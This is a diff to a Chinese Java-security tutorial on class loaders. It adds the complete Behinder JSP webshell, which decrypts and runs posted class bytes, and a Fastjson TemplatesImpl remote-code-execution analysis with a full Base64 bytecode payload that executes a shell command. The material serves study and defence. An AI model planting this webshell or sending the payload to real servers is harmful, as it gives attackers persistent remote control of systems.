@@ -271,6 +271,39 @@ pom.xml
 
 
 
+## JSP自定义类加载后门
+
+以`冰蝎`为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的`equals`方法实现恶意攻击，其中`equals`方法传入的`pageContext`对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。
+
+**示例 - 冰蝎JSP后门：**
+
+```jsp
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
+<%!
+    class U extends ClassLoader {
+
+        U(ClassLoader c) {
+            super(c);
+        }
+
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+%>
+<%
+    if (request.getMethod().equals("POST")) {
+        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+        session.putValue("u", k);
+        Cipher c = Cipher.getInstance("AES");
+        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+    }
+%>
+```
+
+
+
 ## BCEL ClassLoader
 
 [BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`，BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类Payload。
@@ -348,40 +381,7 @@ public class BCELClassLoader {
 	 * </pre>
 	 */
 	private static final byte[] CLASS_BYTES = new byte[]{
-			-54, -2, -70, -66, 0, 0, 0, 50, 0, 56, 10, 0, 15, 0, 26, 8, 0, 27, 8, 0, 28, 10, 0, 29, 0, 30, 8, 0, 31,
-			10, 0, 32, 0, 33, 8, 0, 34, 8, 0, 35, 8, 0, 36, 10, 0, 37, 0, 38, 10, 0, 37, 0, 39, 7, 0, 40, 10, 0, 12,
-			0, 41, 7, 0, 42, 7, 0, 43, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111,
-			100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 8, 60, 99,
-			108, 105, 110, 105, 116, 62, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 44,
-			7, 0, 40, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 18, 84, 101, 115, 116, 66, 67,
-			69, 76, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32,
-			45, 97, 32, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110,
-			97, 109, 101, 7, 0, 45, 12, 0, 46, 0, 47, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 44, 12, 0, 48,
-			0, 49, 1, 0, 22, 99, 97, 108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55,
-			1, 0, 5, 76, 105, 110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115,
-			116, 58, 57, 57, 57, 57, 47, 7, 0, 50, 12, 0, 51, 0, 52, 12, 0, 53, 0, 54, 1, 0, 19, 106, 97, 118, 97, 47,
-			105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 55, 0, 17, 1, 0, 39, 99, 111, 109,
-			47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47,
-			84, 101, 115, 116, 66, 67, 69, 76, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110,
-			103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114,
-			105, 110, 103, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0,
-			11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97,
-			110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83,
-			116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76,
-			106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97,
-			118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117,
-			110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110,
-			116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110,
-			103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114,
-			111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101,
-			0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 2, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0,
-			5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 8, 0, 20, 0, 17, 0, 1, 0, 18,
-			0, 0, 0, -106, 0, 2, 0, 3, 0, 0, 0, 53, 18, 2, 75, 18, 3, -72, 0, 4, 76, 43, 18, 5, -74, 0, 6, -103, 0,
-			9, 18, 7, 75, -89, 0, 15, 43, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 75, -72, 0, 10, 42, -74, 0, 11, 87,
-			-89, 0, 8, 77, 44, -74, 0, 13, -79, 0, 1, 0, 36, 0, 44, 0, 47, 0, 12, 0, 2, 0, 19, 0, 0, 0, 46, 0, 11,
-			0, 0, 0, 8, 0, 3, 0, 9, 0, 9, 0, 11, 0, 18, 0, 12, 0, 24, 0, 13, 0, 33, 0, 14, 0, 36, 0, 18, 0, 44, 0,
-			21, 0, 47, 0, 19, 0, 48, 0, 20, 0, 52, 0, 22, 0, 21, 0, 0, 0, 19, 0, 4, -3, 0, 24, 7, 0, 22, 7, 0, 22,
-			11, 74, 7, 0, 23, -7, 0, 4, 0, 1, 0, 24, 0, 0, 0, 2, 0, 25
+			-54, -2, -70, -66, 0, 0, 0, 50 // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/BCELClassLoader.java
 	};
 
 	public static void main(String[] args) {
@@ -443,41 +443,6 @@ Xalan和BCEL一样都经常被用于编写反序列化Payload，Oracle JDK默认
 
 <img src="../../images/image-20211021195637540.png" alt="image-20211021195637540" style="zoom:50%;" />
 
-通过反序列化方式修改了`_bytecodes/_name/_tfactory/_outputProperties`之后还必须调用`getOutputProperties()`方法，才能触发类创建和实例化。
-
-<img src="../../images/image-20211021200026024.png" alt="image-20211021200026024" style="zoom:50%;" />
-
-**defineClass调用链：**
-
-```java
-java.lang.ClassLoader.defineClass(ClassLoader.java:794)
-java.lang.ClassLoader.defineClass(ClassLoader.java:643)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:163)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:367)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:404)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
-com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
-com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
-```
-
-**getOutputProperties命令执行调用链：**
-
-```java
-java.lang.Runtime.exec(Runtime.java:347)
-com.anbai.sec.classloader.TestAbstractTranslet.<init>(TestAbstractTranslet.java:24)
-sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
-sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
-sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
-java.lang.reflect.Constructor.newInstance(Constructor.java:526)
-java.lang.Class.newInstance(Class.java:383)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
-com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
-com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
-```
-
 **Xalan攻击示例代码：**
 
 ```java
@@ -501,103 +466,9 @@ public class XalanTemplatesImpl {
 
 	/**
 	 * com.anbai.sec.classloader.TestAbstractTranslet类字节码
-	 *
-	 * <pre>
-	 * package com.anbai.sec.classloader;
-	 *
-	 * import com.sun.org.apache.xalan.internal.xsltc.DOM;
-	 * import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-	 * import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-	 * import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-	 * import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-	 *
-	 * import java.io.IOException;
-	 *
-	 * public class TestAbstractTranslet extends AbstractTranslet {
-	 *
-	 * 	public TestAbstractTranslet() {
-	 * 		String command = "open -a Calculator.app";
-	 * 		String osName  = System.getProperty("os.name");
-	 *
-	 * 		if (osName.startsWith("Windows")) {
-	 * 			command = "calc 12345678901234567";
-	 *      } else if (osName.startsWith("Linux")) {
-	 * 			command = "curl localhost:9999/";
-	 *      }
-	 *
-	 * 		try {
-	 * 			Runtime.getRuntime().exec(command);
-	 *      } catch (IOException e) {
-	 * 			e.printStackTrace();
-	 *      }
-	 *    }
-	 *
-	 *    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-	 *    }
-	 *
-	 *    public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {
-	 *    }
-	 * }
-	 * </pre>
 	 */
 	public static final byte[] CLASS_BYTES = new byte[]{
-			-54, -2, -70, -66, 0, 0, 0, 50, 0, 62, 10, 0, 15, 0, 31, 8, 0, 32, 8, 0, 33, 10, 0, 34, 0, 35, 8, 0,
-			36, 10, 0, 37, 0, 38, 8, 0, 39, 8, 0, 40, 8, 0, 41, 10, 0, 42, 0, 43, 10, 0, 42, 0, 44, 7, 0, 45, 10,
-			0, 12, 0, 46, 7, 0, 47, 7, 0, 48, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4,
-			67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1,
-			0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 47, 7, 0, 49, 7, 0, 45, 1, 0,
-			9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110,
-			47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101,
-			114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115,
-			117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116,
-			101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105,
-			97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 10, 69,
-			120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 50, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117,
-			110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116,
-			101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115,
-			117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116,
-			101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97,
-			116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104,
-			101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108,
-			105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110,
-			100, 108, 101, 114, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 25,
-			84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 46, 106,
-			97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32, 45, 97, 32, 67, 97, 108, 99, 117,
-			108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 51, 12, 0,
-			52, 0, 53, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 49, 12, 0, 54, 0, 55, 1, 0, 22, 99, 97,
-			108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 1, 0, 5, 76, 105,
-			110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 57,
-			57, 57, 57, 47, 7, 0, 56, 12, 0, 57, 0, 58, 12, 0, 59, 0, 60, 1, 0, 19, 106, 97, 118, 97, 47, 105,
-			111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 61, 0, 17, 1, 0, 46, 99, 111,
-			109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100,
-			101, 114, 47, 84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108,
-			101, 116, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104,
-			101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116,
-			99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110,
-			115, 108, 101, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110,
-			103, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101,
-			47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99,
-			47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 16, 106,
-			97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80,
-			114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47,
-			83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114,
-			105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106,
-			97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97,
-			118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82,
-			117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82,
-			117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47,
-			108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110,
-			103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107,
-			84, 114, 97, 99, 101, 0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 3, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0,
-			-93, 0, 2, 0, 4, 0, 0, 0, 57, 42, -73, 0, 1, 18, 2, 76, 18, 3, -72, 0, 4, 77, 44, 18, 5, -74, 0, 6,
-			-103, 0, 9, 18, 7, 76, -89, 0, 15, 44, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 76, -72, 0, 10, 43, -74,
-			0, 11, 87, -89, 0, 8, 78, 45, -74, 0, 13, -79, 0, 1, 0, 40, 0, 48, 0, 51, 0, 12, 0, 2, 0, 19, 0, 0, 0,
-			50, 0, 12, 0, 0, 0, 13, 0, 4, 0, 14, 0, 7, 0, 15, 0, 13, 0, 17, 0, 22, 0, 18, 0, 28, 0, 19, 0, 37, 0,
-			20, 0, 40, 0, 24, 0, 48, 0, 27, 0, 51, 0, 25, 0, 52, 0, 26, 0, 56, 0, 28, 0, 20, 0, 0, 0, 24, 0, 4, -1,
-			0, 28, 0, 3, 7, 0, 21, 7, 0, 22, 7, 0, 22, 0, 0, 11, 74, 7, 0, 23, 4, 0, 1, 0, 24, 0, 25, 0, 2, 0, 18, 0,
-			0, 0, 25, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 33, 0, 26, 0, 0, 0,
-			4, 0, 1, 0, 27, 0, 1, 0, 24, 0, 28, 0, 2, 0, 18, 0, 0, 0, 25, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 1,
-			0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 38, 0, 26, 0, 0, 0, 4, 0, 1, 0, 27, 0, 1, 0, 29, 0, 0, 0, 2, 0, 30
+			-54, -2, -70, -66 // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/XalanTemplatesImpl.java
 	};
 
 	/**
@@ -692,6 +563,104 @@ public class XalanTemplatesImpl {
 ```
 
 在MacOS和Windows上执行示例程序后会弹出计算器，Linux会执行`curl localhost:9999`。
+
+
+
+### Xalan FastJson攻击链分析
+
+为了深入学习Xalan攻击链，这里我们以Fastjson为例分析其攻击原理，Fastjson（1.2.2 - 1.2.4）在启用了`SupportNonPublicField`特性时可以利用Xalan的TemplatesImpl实现RCE，具体的利用代码如下：
+
+```json
+{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADIAPgoADwAfCAAgCAAhCgAiACMIACQKACUAJggAJwgAKAgAKQoAKgArCgAqACwHAC0KAAwALgcALwcAMAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwAvBwAxBwAtAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcAMgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApTb3VyY2VGaWxlAQAZVGVzdEFic3RyYWN0VHJhbnNsZXQuamF2YQwAEAARAQAWb3BlbiAtYSBDYWxjdWxhdG9yLmFwcAEAB29zLm5hbWUHADMMADQANQEAB1dpbmRvd3MHADEMADYANwEAFmNhbGMgMTIzNDU2Nzg5MDEyMzQ1NjcBAAVMaW51eAEAFGN1cmwgbG9jYWxob3N0Ojk5OTkvBwA4DAA5ADoMADsAPAEAE2phdmEvaW8vSU9FeGNlcHRpb24MAD0AEQEALmNvbS9hbmJhaS9zZWMvY2xhc3Nsb2FkZXIvVGVzdEFic3RyYWN0VHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAQamF2YS9sYW5nL1N0cmluZwEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAOAA8AAAAAAAMAAQAQABEAAQASAAAAowACAAQAAAA5KrcAARICTBIDuAAETSwSBbYABpkACRIHTKcADywSCLYABpkABhIJTLgACiu2AAtXpwAITi22AA2xAAEAKAAwADMADAACABMAAAAyAAwAAAANAAQADgAHAA8ADQARABYAEgAcABMAJQAUACgAGAAwABsAMwAZADQAGgA4ABwAFAAAABgABP8AHAADBwAVBwAWBwAWAAALSgcAFwQAAQAYABkAAgASAAAAGQAAAAMAAAABsQAAAAEAEwAAAAYAAQAAACEAGgAAAAQAAQAbAAEAGAAcAAIAEgAAABkAAAAEAAAAAbEAAAABABMAAAAGAAEAAAAmABoAAAAEAAEAGwABAB0AAAACAB4="],"_name":"","_tfactory":{},"_outputProperties":{}}
+```
+
+`@type`标注的是需要反序列化的类名`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，`_bytecodes`是经过Base64编码（FastJson会自动解码成byte[]）后的`com.anbai.sec.classloader.TestAbstractTranslet`类字节码，`_name`、`_tfactory`、`_outputProperties`没有什么实际意义这里保持不为空就可以了。
+
+传入的`_bytecodes`字节码是class文件经过Base64编码的字符串（Linux下可以使用base64命令，如：`base64 TestAbstractTranslet.class`），该类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，示例中的`TestAbstractTranslet.java`的代码如下：
+
+```java
+package com.anbai.sec.classloader;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.IOException;
+
+public class TestAbstractTranslet extends AbstractTranslet {
+	public TestAbstractTranslet() {
+    // Windows和MacOS是弹出计算器，Linux会执行curl localhost:9999/
+		String command = "open -a Calculator.app";
+		String osName  = System.getProperty("os.name");
+
+		if (osName.startsWith("Windows")) {
+			command = "calc 12345678901234567";
+		} else if (osName.startsWith("Linux")) {
+			command = "curl localhost:9999/";
+		}
+
+		try {
+			Runtime.getRuntime().exec(command);
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+
+	@Override
+	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+	}
+
+	@Override
+	public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {
+	}
+}
+```
+
+Fastjson会创建`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类实例，并通过json中的字段去映射`TemplatesImpl`类中的成员变量，比如将`_bytecodes` 经过Base64解码后将byte[]映射到`TemplatesImpl`类的`_bytecodes`上，其他字段同理。但仅仅是属性映射是无法触发传入的类实例化的，还必须要调用`getOutputProperties()`方法才会触发`defineClass`（使用传入的恶意类字节码创建类）和`newInstance`（创建恶意类实例，从而触发恶意类构造方法中的命令执行代码），此时已是万事俱备，只欠东风了。
+
+Fastjson在解析类成员变量（`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField`）的时候会将`private Properties _outputProperties;`属性与`getOutputProperties()`关联映射（FastJson的`smartMatch()`会忽略`_`、`-`、`is`（仅限boolean/Boolean类型），所以能够匹配到`getOutputProperties()`方法），因为`_outputProperties`是Map类型（Properties是Map的子类）所以不需要通过set方法映射值（`fieldInfo.getOnly`），因此在setValue的时候会直接调用`getOutputProperties()`方法，如下图：
+
+<img src="../../images/image-20211023201104486.png" alt="image-20211023201104486" style="zoom:50%;" />
+
+调用`getOutputProperties()`方法后会触发类创建和实例化，如下图：
+
+<img src="../../images/image-20211021200026024.png" alt="image-20211021200026024" style="zoom:50%;" />
+
+**defineClass TestAbstractTranslet调用链：**
+
+```java
+java.lang.ClassLoader.defineClass(ClassLoader.java:794)
+java.lang.ClassLoader.defineClass(ClassLoader.java:643)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:163)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:367)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:404)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
+com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
+com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
+```
+
+创建`TestAbstractTranslet`类实例，如下图：
+
+<img src="../../images/image-20211023203901358.png" alt="image-20211023203901358" style="zoom:50%;" />
+
+创建`TestAbstractTranslet`类实例时就会触发`TestAbstractTranslet`构造方法中的命令执行代码，调用链如下：
+
+```java
+java.lang.Runtime.exec(Runtime.java:347)
+com.anbai.sec.classloader.TestAbstractTranslet.<init>(TestAbstractTranslet.java:24)
+sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
+sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+java.lang.reflect.Constructor.newInstance(Constructor.java:526)
+java.lang.Class.newInstance(Class.java:383)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
+com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
+com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
+```
 
 
 
@@ -874,7 +843,7 @@ public class TestJSPClassLoader {
 }
 ```
 
-该示例程序通过Javassist动态生成了两个不同的`com.anbai.sec.classloader.test_jsp`类字节码，模拟JSP文件修改后的类加载，核心原理就是**检测到JSP文件修改后动态替换类加载器**，从而实现JSP热加载，具体的处理逻辑如下（第3和第4部未实现，使用了Javassist动态创建类字节码模拟）：
